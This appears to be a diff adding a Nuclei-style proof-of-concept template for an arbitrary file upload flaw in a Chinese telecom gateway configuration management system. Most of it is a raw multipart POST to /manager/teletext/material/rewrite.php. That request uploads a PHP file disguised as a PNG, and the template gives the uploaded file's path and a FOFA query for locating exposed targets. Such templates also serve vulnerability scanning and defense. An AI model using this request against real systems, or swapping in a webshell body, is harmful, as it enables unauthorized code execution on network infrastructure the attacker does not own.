@@ -1,0 +1,67 @@
+id: poc-tri63f44z6ckkge3
+info:
+  name: 电信网关配置管理系统-文件上传-rewrite
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tri63f44z6ckkge3'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tri63f44z6ckkge3
+    fofa: body="img/dl.gif" && title="系统登录"
+http:
+- raw:
+  - 'POST /manager/teletext/material/rewrite.php HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundaryOKldnDPT
+
+
+    Content-Disposition: form-data; name="tmp_name"; filename="dudesite.php"
+
+
+    Content-Type: image/png
+
+
+
+
+    <?php echo md5(''666'');unlink(__FILE__);?>
+
+
+    ------WebKitFormBoundaryOKldnDPT
+
+
+    Content-Disposition: form-data; name="uploadtime"
+
+
+
+
+    ------WebKitFormBoundaryOKldnDPT--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /xmedia/material/dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
